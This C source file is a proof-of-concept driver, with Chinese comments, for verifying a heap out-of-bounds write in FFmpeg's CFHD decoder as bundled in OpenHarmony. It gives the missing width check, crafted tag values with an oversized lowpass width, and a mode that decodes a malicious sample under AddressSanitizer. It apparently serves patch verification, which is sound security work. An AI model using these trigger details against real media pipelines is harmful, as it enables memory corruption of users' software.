/*
 * CVE-2026-70632 运行验证 PoC 驱动 — third_party/ffmpeg CFHD transform-2
 * 输出宽度无界堆越界写
 *
 * 等价性：OH third_party_ffmpeg(0a0c4dd33c) 的 libavcodec/cfhd.c 与上游
 * n7.1.1 逐字节一致（case.json oh_source.equivalence），两份上游修复 diff
 * db05df9d/16b2049d 对 OH 检出 git apply --check 通过。上游修复主题即
 * "reject transform-2 output wider than the plane"，复现样本名
 * cfhd_transform2_output_width_oob.avi。
 *
 * 缺陷形态：level-2 重构块（cfhd.c:1032-1038）以 lowpass_width*2 的行宽
 * 写 subband[0]，而该级入口校验（:969/:1010 两处）缺少上游修复新增的
 * "lowpass_width * 2 > s->plane[plane].width" 约束（level-3 的同型校验
 * :1052 修复前即存在——三条校验不对称正是缺口证据）。
 *
 * 用法：
 *   ./poc_cfhd demo                 构造 tag-only 流演示维度记账路径
 *   ./poc_cfhd sample <file.avi>    解码上游样本（ASan 下观测 heap-buffer-overflow）
 *
 * 说明（如实申报）：tag-only 流不含 VLC 系数数据，无法驱动到重构写循环
 * （上游样本含系数数据）；故运行级观测以 sample 模式 + 上游样本为准，
 * demo 模式用于验证 tag 语义与尺寸记账路径（返回值/日志可回归）。样本
 * 名以上游修复 commit message 为准（cfhd_transform2_output_width_oob.avi）。
 * 判读：ASan 构建下 sample 模式 trigger 报 heap-buffer-overflow WRITE，
 *       应用所附 patch.diff（上游同型约束）后同输入返回 EINVAL 不越界。
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "libavcodec/avcodec.h"
#include "libavutil/mem.h"

/* CFHDParam 标签值（cfhd.h enum CFHDParam） */
enum {
    TAG_FRAME_TYPE      = 19,
    TAG_IMAGE_WIDTH     = 20,
    TAG_IMAGE_HEIGHT    = 21,
    TAG_LOWPASS_SUBBAND = 25,
    TAG_NUM_LEVELS      = 26,
    TAG_LOWPASS_WIDTH   = 27,
    TAG_LOWPASS_HEIGHT  = 28,
    TAG_CHANNEL_COUNT   = 12,
    TAG_TRANSFORM_TYPE  = 10,
    TAG_SUBBAND_COUNT   = 14,
};

static void put_tag(uint8_t **p, uint16_t tag, uint16_t data)
{
    (*p)[0] = tag >> 8; (*p)[1] = tag & 0xff;
    (*p)[2] = data >> 8; (*p)[3] = data & 0xff;
    *p += 4;
}

int main(int argc, char **argv)
{
    if (argc < 2) { fprintf(stderr, "usage: %s demo | sample <file>\n", argv[0]); return 2; }

    const AVCodec *codec = avcodec_find_decoder(AV_CODEC_ID_CFHD);
    if (!codec) { fprintf(stderr, "cfhd decoder not built\n"); return 3; }
    AVCodecContext *ctx = avcodec_alloc_context3(codec);
    if (!ctx) return 4;
    if (avcodec_open2(ctx, codec, NULL) < 0) { fprintf(stderr, "open failed\n"); return 5; }

    AVPacket *packet = av_packet_alloc();
    AVFrame *frame = av_frame_alloc();
    int ret = -1;

    if (!strcmp(argv[1], "demo")) {
        /* tag-only 流：通道数/变换类型(2)/图像尺寸(小)/lowpass 尺寸(大)——
         * 维度记账到达 level-2 入口；无系数数据，重构循环不可达（见文件头说明） */
        uint8_t buf[256];
        uint8_t *p = buf;
        put_tag(&p, TAG_CHANNEL_COUNT, 3);
        put_tag(&p, TAG_TRANSFORM_TYPE, 2);
        put_tag(&p, TAG_FRAME_TYPE, 0);
        put_tag(&p, TAG_IMAGE_WIDTH, 16);
        put_tag(&p, TAG_IMAGE_HEIGHT, 16);
        put_tag(&p, TAG_LOWPASS_WIDTH, 24);   /* *2 = 48 > plane width 16 */
        put_tag(&p, TAG_LOWPASS_HEIGHT, 16);
        put_tag(&p, TAG_NUM_LEVELS, 3);
        put_tag(&p, TAG_SUBBAND_COUNT, 0);
        av_new_packet(packet, (int)(p - buf));
        memcpy(packet->data, buf, p - buf);
        ret = avcodec_send_packet(ctx, packet);
        printf("case=cfhd_demo send=%d ", ret);
        ret = avcodec_receive_frame(ctx, frame);
        printf("recv=%d（无系数数据，预期 clean 拒绝；越界写需上游样本系数流）\n", ret);
    } else if (argc == 3 && !strcmp(argv[1], "sample")) {
        uint8_t *data = NULL;
        size_t size = 0;
        FILE *f = fopen(argv[2], "rb");
        if (!f) { perror("fopen"); return 6; }
        fseek(f, 0, SEEK_END); size = ftell(f); fseek(f, 0, SEEK_SET);
        data = av_malloc(size);
        if (fread(data, 1, size, f) != size) { fclose(f); return 7; }
        fclose(f);
        /* 样本为 AVI：帧负载已剥离容器，此处直接送入解码器；
         * 容器路径请用 ffmpeg CLI：ffmpeg -i sample.avi -f null - （ASan 构建） */
        av_new_packet(packet, (int)size);
        memcpy(packet->data, data, size);
        ret = avcodec_send_packet(ctx, packet);
        printf("case=cfhd_sample send=%d\n", ret);
        while (ret >= 0) {
            ret = avcodec_receive_frame(ctx, frame);
            if (ret == EAGAIN || ret < 0) break;
            printf("case=cfhd_sample frame=%dx%d\n", frame->width, frame->height);
        }
        av_free(data);
    } else {
        fprintf(stderr, "usage: %s demo | sample <file>\n", argv[0]);
        return 2;
    }

    av_frame_free(&frame);
    av_packet_free(&packet);
    avcodec_free_context(&ctx);
    return 0;
}
